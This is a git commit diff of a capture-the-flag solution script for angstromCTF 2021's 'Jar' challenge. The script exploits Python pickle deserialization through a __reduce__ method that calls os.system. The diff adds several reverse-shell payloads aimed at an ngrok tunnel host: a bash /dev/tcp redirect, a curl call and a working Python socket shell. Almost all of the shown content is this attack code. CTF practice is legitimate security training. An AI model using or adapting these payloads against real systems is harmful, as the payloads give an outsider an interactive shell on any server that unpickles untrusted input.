e6b2902f0f2e7d424408e1707a75ead3a9b42f86
Vincent550102 <5020559@gmail.com>
2021-04-11 04:08:47 +0800

    upd

--- Team/angstromctf/angstromctf2021/Jar/sol2.py
+++ Team/angstromctf/angstromctf2021/Jar/sol2.py
@@ -5,7 +5,11 @@ import os
 
 class RCE:
     def __reduce__(self):
-        cmd = ('bash -i >& /dev/https/559c1a78c710.ngrok.io 0>&1')
+        #cmd = ('bash -i >& /dev/tcp/6.tcp.ngrok.io/17366 0>&1')
+        #cmd = ('curl 6.tcp.ngrok.io:17366') 
+        #cmd = ('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",17366));os.dup2(s.fileno,0); os.dup2(s.fileno,1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);' ''')
+        cmd = ('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",17366));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
+        print(cmd)
         return os.system, (cmd,)
 
 
